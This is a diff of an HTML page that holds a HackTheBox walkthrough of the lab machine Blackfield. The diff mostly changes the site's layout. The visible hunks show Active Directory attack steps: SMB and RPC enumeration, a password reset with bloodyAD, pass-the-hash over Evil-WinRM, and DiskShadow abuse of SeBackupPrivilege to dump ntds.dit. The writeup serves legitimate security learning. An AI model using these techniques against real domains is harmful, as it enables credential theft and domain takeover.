@@ -1,16 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Blackfield - HTB</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
-    <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/styles.css" rel="stylesheet">
+    <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
-    <link href="/css/writeups.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
@@ -18,36 +17,65 @@
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
-            <aside class="sidebar">
+            <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="Logo">
+                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
                 </div>
                 <nav>
-                    <ul class="nav flex-column">
-                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
-                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
-                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
-                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
-                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
-                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
+                    <ul class="nav-menu">   
+                        <li class="nav-item">
+                            <a href="/" class="nav-link">
+                                <i>🏠</i>
+                                <span>Home</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/articles" class="nav-link active">
+                                <i>📝</i>
+                                <span>Articles</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/writeups" class="nav-link">
+                                <i>💻</i>
+                                <span>WriteUps</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/notes" class="nav-link">
+                                <i>📚</i>
+                                <span>Notes</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
+                                <i>⚡</i>
+                                <span>KL-Sunset</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/about" class="nav-link">
+                                <i>👤</i>
+                                <span>About me</span>
+                            </a>
+                        </li>
                     </ul>
                 </nav>
             </aside>
+
             <!-- Main Content -->
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%" src="/writeups/htb/hard/blackfield/img/blackfield.png">
-                <h2>Blackfield - HTB</h2>
-                <p>walkthrough by elswix<p>
-                <ul class="machine-links" style="display: none">
-                    <li><a href="https://app.hackthebox.com/machines/Blackfield">HackTheBox</a></li>
-                </ul>
-            </section>
+                    <img src="/writeups/htb/hard/blackfield/img/blackfield.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <h2>Blackfield - HTB</h2>
+                    <p>walkthrough by elswixHackTheBox</p>
+                </section>
+
                 <section class="article-content">
-                    <div class="article-container">
-                        <div class="article-content-main">                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Blackfield</span>
+<div class="article-container">
+<div class="article-content-main"> <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Blackfield</span>
 <span class="k">Difficulty</span><span class="p">:</span> <span class="n">Hard</span>
 <span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
 <span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">06</span><span class="o">/</span><span class="mi">2020</span>
@@ -56,14 +84,14 @@
 Blackfield is a hard level machine on the HackTheBox platform. It is an Active Directory-based environment, where our initial reconnaissance involved analyzing a network-level shared resource exposed through SMB. This shared resource hosted an extensive array of directories, seemingly corresponding to usernames. We proceeded to extract all these directory names and subsequently embarked on enumerating whether any of them were associated with system users. We identified three valid users, one of whom was found to be susceptible to an ASREP Roast attack.<br/><br/>
 We successfully obtained the Ticket Granting Ticket (TGT) for the relevant user, successfully decrypted it, and acquired valid credentials for the <code>Support</code> user.<br/><br/>
 Subsequently, we executed the <code>bloodhound-python</code> tool to conduct a comprehensive scan of the Domain Controller and, by extension, the entire Active Directory environment. Through this scanning process, we identified a vulnerability that allowed us to change the password of the <code>audit2020</code> user, leveraging the <code>ForceChangePassword</code> attribute that we had access to.<br/><br/>
-<h3><br>Shell as svc_backup</br></h3><br>
-After successfully changing the password for the <code>audit2020</code> user, we were able to gain access to a network-level shared resource via SMB. This shared resource contained critical information, including a memory dump of the LSASS process. Using the <code>pypykatz</code> tool, we were able to perform a dump of the LSASS and obtain NT hash credentials for the <code>svc_backup</code> user.<br/><br/>
+<h3><br/>Shell as svc_backup</h3><br/>
+After successfully changing the password for the <code>audit2020</code> user, we were able to gain access to a network-level shared resource via SMB. This shared resource contained critical information, including a memory dump of the LSASS process. Using the <code>pypykatz</code> tool, we were able to perform a dump of the LSASS and obtain NT hash credentials for the <code>svc_backup</code> user.<br><br/>
 Fortunately, the <code>svc_backup</code> user is a member of the <code>Remote Management Users</code> group, enabling us to utilize their credentials (via the PassTheHash technique using the NT hash) to access the WinRM service. Using the <code>Evil-WinRM</code> tool, we successfully established a remote connection and obtained a remote console on the system.<br/><br/>
-<h3><br>Shell as Administrator</br></h3><br>
-As the <code>svc_backup</code> user, we possess the <code>SeBackupPrivilege</code> privilege, which allows us to create backups of any system file, regardless of whether Administrator privileges are required. Using the DiskShadow tool, we created a <code>shadow copy</code> of the root structure of the system on a logical drive. Subsequently, with the <code>robocopy</code> command, we created a copy of the <code>ntds.dit</code> file and the system registry. These files enabled us to perform a dump and obtain the NT hashes for all domain-level users, ultimately granting us administrative access. <br/><br/>
+<h3><br/>Shell as Administrator</h3><br/>
+As the <code>svc_backup</code> user, we possess the <code>SeBackupPrivilege</code> privilege, which allows us to create backups of any system file, regardless of whether Administrator privileges are required. Using the DiskShadow tool, we created a <code>shadow copy</code> of the root structure of the system on a logical drive. Subsequently, with the <code>robocopy</code> command, we created a copy of the <code>ntds.dit</code> file and the system registry. These files enabled us to perform a dump and obtain the NT hashes for all domain-level users, ultimately granting us administrative access. <br><br/>
 <hr/>
-<h3><br>Recon</br></h3><br>
-Before initiating any exploitation processes, it is crucial to acquire a comprehensive understanding of the attack surface, which encompasses services, technologies, systems, and other relevant aspects. It is imperative to emphasize that conducting thorough enumeration constitutes a critical component as it provides a solid foundation for success in the subsequent exploitation of the services exposed by the target machine.<br/><br/>
+<h3><br/>Recon</h3><br/>
+Before initiating any exploitation processes, it is crucial to acquire a comprehensive understanding of the attack surface, which encompasses services, technologies, systems, and other relevant aspects. It is imperative to emphasize that conducting thorough enumeration constitutes a critical component as it provides a solid foundation for success in the subsequent exploitation of the services exposed by the target machine.<br><br/>
 First and foremost, it is essential to conduct a scanning operation to ascertain which ports are accessible on the target machine, as these ports serve as entry points to the services exposed by it.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.10.192</span> <span class="o">-</span><span class="n">oG</span> <span class="n">portScan</span> 
 
@@ -110,8 +138,8 @@ I will proceed to add the <code>BLACKFIELD.local</code> domain to my <code>/etc/
 <span class="c1"># HackTheBox</span>
 <span class="mf">10.10.10.192</span> <span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span>
 </pre></div>
-<h3><br>DNS Enumeration</br></h3><br>
-To begin, we will initiate the enumeration of the DNS service available through port 53. To carry out this task, we will employ the <code>dig</code> tool.<br/><br/>
+<h3><br/>DNS Enumeration</h3><br/>
+To begin, we will initiate the enumeration of the DNS service available through port 53. To carry out this task, we will employ the <code>dig</code> tool.<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">dig</span> <span class="o">@</span><span class="mf">10.10.10.192</span> <span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span> 
 <span class="p">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="n">DiG</span> <span class="mf">9.18.16</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">Debian</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="o">@</span><span class="mf">10.10.10.192</span> <span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span>
 <span class="p">;</span> <span class="p">(</span><span class="mi">1</span> <span class="n">server</span> <span class="n">found</span><span class="p">)</span>
@@ -135,8 +163,8 @@ To begin, we will initiate the enumeration of the DNS service available through 
 <span class="p">;;</span> <span class="n">WHEN</span><span class="p">:</span> <span class="n">Wed</span> <span class="n">Sep</span> <span class="mi">20</span> <span class="mi">19</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">14</span> <span class="o">-</span><span class="mi">03</span> <span class="mi">2023</span>
 <span class="p">;;</span> <span class="n">MSG</span> <span class="n">SIZE</span>  <span class="n">rcvd</span><span class="p">:</span> <span class="mi">61</span>
 </pre></div>
-<h3><br>Name Server</br></h3><br>
-We proceed to enumerate the Name Servers:<br/><br/>
+<h3><br/>Name Server</h3><br/>
+We proceed to enumerate the Name Servers:<br><br/>
 This command will utilize the <code>dig</code> tool to retrieve information about the Name Servers associated with the <code>BLACKFIELD.local</code> domain.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">dig</span> <span class="o">@</span><span class="mf">10.10.10.192</span> <span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span> <span class="n">ns</span>
 
@@ -181,8 +209,8 @@ We have been provided with information suggesting the existence of a subdomain. 
 <span class="c1"># HackTheBox</span>
 <span class="mf">10.10.10.192</span> <span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span> <span class="n">dc01</span><span class="o">.</span><span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span>
 </pre></div>
-<h3><br>Transfer Zone</br></h3><br>
-When attempting a Zone Transfer attack, we observed that it was not successful:<br/><br/>
+<h3><br/>Transfer Zone</h3><br/>
+When attempting a Zone Transfer attack, we observed that it was not successful:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">dig</span> <span class="o">@</span><span class="mf">10.10.10.192</span> <span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span> <span class="n">axfr</span>
 <span class="p">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="n">DiG</span> <span class="mf">9.18.16</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">Debian</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="o">@</span><span class="mf">10.10.10.192</span> <span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span> <span class="n">axfr</span>
 <span class="p">;</span> <span class="p">(</span><span class="mi">1</span> <span class="n">server</span> <span class="n">found</span><span class="p">)</span>
@@ -191,8 +219,8 @@ When attempting a Zone Transfer attack, we observed that it was not successful:<
 </pre></div>
 
 While it is possible to enumerate the mail servers and other services, at this moment, that information is not relevant to our current objectives.<br/><br/>
-<h3><br>RPC Enumeration</br></h3><br>
-Now, we proceed to enumerate the RPC service, which appears to allow us to establish connections without the need for credentials, in other words, it allows us to create a null session:<br/><br/>
+<h3><br/>RPC Enumeration</h3><br/>
+Now, we proceed to enumerate the RPC service, which appears to allow us to establish connections without the need for credentials, in other words, it allows us to create a null session:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="s2">""</span> <span class="mf">10.10.10.192</span> <span class="o">-</span><span class="n">N</span>
 <span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span>
 </pre></div>
@@ -204,8 +232,8 @@ When attempting to retrieve information about the Domain Controller (DC), we are
 <span class="n">result</span> <span class="n">was</span> <span class="n">NT_STATUS_ACCESS_DENIED</span>
 <span class="n">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span>
 </pre></div>
-<h3><br>SMB Enumeration</br></h3><br>
-Next, we will commence the enumeration of the SMB service, which is located on port 445. To accomplish this, we will utilize the <a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a> tool.<br/><br/>
+<h3><br/>SMB Enumeration</h3><br/>
+Next, we will commence the enumeration of the SMB service, which is located on port 445. To accomplish this, we will utilize the <a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a> tool.<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.10.192</span>
 <span class="n">SMB</span>         <span class="mf">10.10.10.192</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
 </pre></div>
@@ -224,8 +252,8 @@ A recommended practice is to add the HOSTNAME to the <code>/etc/hosts</code> fil
 <span class="c1"># HackTheBox</span>
 <span class="mf">10.10.10.192</span> <span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span> <span class="n">DC01</span> <span class="n">dc01</span><span class="o">.</span><span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span>
 </pre></div>
-<h3><br>Shared resources</br></h3><br>
-Normally, in companies that adhere to good security practices, valid credentials are required to access these shared resources. However, on occasion, connections using a Null Session or a Guest Session may allow access to shared resources without the need for prior authentication.<br/><br/>
+<h3><br/>Shared resources</h3><br/>
+Normally, in companies that adhere to good security practices, valid credentials are required to access these shared resources. However, on occasion, connections using a Null Session or a Guest Session may allow access to shared resources without the need for prior authentication.<br><br/>
 In my case, I will opt to use a Guest Session, once again employing <a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a>.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.10.192</span> <span class="o">-</span><span class="n">u</span> <span class="s2">"elswix"</span> <span class="o">-</span><span class="n">p</span> <span class="s2">""</span> <span class="o">--</span><span class="n">shares</span>
 <span class="n">SMB</span>         <span class="mf">10.10.10.192</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
@@ -692,7 +720,7 @@ Once this scan is complete, the following files will be generated in the current
 
 If you are not familiar with the use of BloodHound, I recommend referring to this <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux">documentation</a> for guidance on its usage. This will provide you with a detailed guide on how to utilize this tool effectively.<br/><br/>
 After conducting an initial analysis through BloodHound, we have discovered that the user for whom we have credentials has permissions to change the password for the <code>Audit2020</code> user.<br/><br/>
-<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Hard/Blackfield/img/1.png?raw=true"/><br/><br/>
+<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Hard/Blackfield/img/1.png?raw=true"><br/><br/>
 We can change their password remotely using various tools, and in my case, I will utilize <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a>.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">bloodyAD</span> <span class="o">-</span><span class="n">d</span> <span class="n">BLACKFIELD</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'support'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'#00^BlackKnight'</span> <span class="o">--</span><span class="n">host</span> <span class="mf">10.10.10.192</span> <span class="nb">set</span> <span class="n">password</span> <span class="n">audit2020</span> <span class="s1">'Password123$!'</span>
 <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Password</span> <span class="n">changed</span> <span class="n">successfully</span><span class="err">!</span>
@@ -729,8 +757,8 @@ To access, we will provide the username with which we want to log in, and we wil
 <span class="n">Try</span> <span class="s2">"help"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="o">.</span>
 <span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span>
 </pre></div>
-<h3><br>Shell as svc_backup</br></h3><br>
-After conducting a brief enumeration, my attention was drawn to the directory named <code>memory_analysis,</code> which contained the following:<br/><br/>
+<h3><br/>Shell as svc_backup</h3><br/>
+After conducting a brief enumeration, my attention was drawn to the directory named <code>memory_analysis,</code> which contained the following:<br><br/>
 <div class="highlight"><pre><span></span><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">cd</span> <span class="n">memory_analysis</span>
 <span class="n">smb</span><span class="p">:</span> \<span class="n">memory_analysis</span>\<span class="o">&gt;</span> <span class="nb">dir</span>
   <span class="o">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Thu</span> <span class="n">May</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">33</span> <span class="mi">2020</span>
@@ -802,8 +830,8 @@ Upon navigating to the <code>Desktop</code> directory, we were able to view the 
 <span class="mi">3920</span><span class="n">b</span><span class="o">*********************</span><span class="mi">4</span><span class="n">b543</span>
 <span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_backup</span>\<span class="n">Desktop</span><span class="o">&gt;</span>
 </pre></div>
-<h3><br>Shell as Administrator</br></h3><br>
-When listing our privileges, we notice that we have the <code>SeBackupPrivilege</code> privilege. This privilege can be of great significance, as through backups, we could attempt to clone the root structure of the system to access resources that we initially do not have access to due to privilege limitations.<br/><br/>
+<h3><br/>Shell as Administrator</h3><br/>
+When listing our privileges, we notice that we have the <code>SeBackupPrivilege</code> privilege. This privilege can be of great significance, as through backups, we could attempt to clone the root structure of the system to access resources that we initially do not have access to due to privilege limitations.<br><br/>
 <div class="highlight"><pre><span></span><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_backup</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span>
 
 <span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
@@ -820,8 +848,8 @@ When listing our privileges, we notice that we have the <code>SeBackupPrivilege<
 
 <span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_backup</span>\<span class="n">Desktop</span><span class="o">&gt;</span>
 </pre></div>
-<h3><br>Disk Shadow</br></h3><br>
-We will use the DiskShadow tool to <code>clone</code> the system's root. By following this <a href="https://pentestlab.blog/tag/diskshadow/">documentation</a>, we can guide ourselves through the steps to perform this correctly.<br/><br/>
+<h3><br/>Disk Shadow</h3><br/>
+We will use the DiskShadow tool to <code>clone</code> the system's root. By following this <a href="https://pentestlab.blog/tag/diskshadow/">documentation</a>, we can guide ourselves through the steps to perform this correctly.<br><br/>
 <em>"<strong>DiskShadow</strong> is a Microsoft signed binary which is used to assist administrators with operations related to the Volume Shadow Copy Service (VSS). Originally <a href="https://twitter.com/bohops">bohops</a> wrote about this binary in his <a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">blog</a>. This binary has two modes <strong>interactive</strong> and <strong>script</strong> and therefore a script file can be used that will contain all the necessary commands to automate the process of NTDS.DIT extraction. The script file can contain the following lines in order to create a new volume shadow copy, mount a new drive, execute the copy command and delete the volume shadow copy."</em><br/><br/>
 <em><a href="https://pentestlab.blog/tag/diskshadow/">PentestLab</a></em><br/><br/>
 The main idea here is to create a <code>copy</code> of the system's root structure and then perform a backup of the <code>ntds.dit</code> file, all while leveraging the <code>SeBackupPrivilege</code> privilege. This will allow us to perform a dump of the <code>ntds.dit</code> file using the <code>secretsdump</code> tool from the <a href="https://github.com/fortra/impacket">Impacket</a> suite.<br/><br/>
@@ -1037,15 +1065,17 @@ We confirm that the hash is valid, and since it corresponds to the <code>Adminis
 <span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>\<span class="n">root</span><span class="o">.</span><span class="n">txt</span>
 <span class="mi">4375</span><span class="n">a</span><span class="o">*********************</span><span class="n">c955cb</span>
 <span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span>
-</pre></div></br></br></br></br></br></br></br></br></br></br></br></br>
-            </div>
+</pre></div></br></br></br></img></br></br></br></br></br></br></br></br></br>
+</div>
+</div>
+</section>
+<script src="/js/sidebarToggle.js"></script>
+<script src="/js/fixMobileImages.js"></script>
+<footer>
+<p>© 2024 elswix.github.io</p>
+</footer>
+            </main>
         </div>
-    </section>
-
-    <script src="/js/sidebarToggle.js"></script>
-    <script src="/js/fixMobileImages.js"></script>
-    <footer>
-        <p>&copy; 2024 elswix.github.io</p>
-    </footer>
+    </div>
 </body>
 </html>
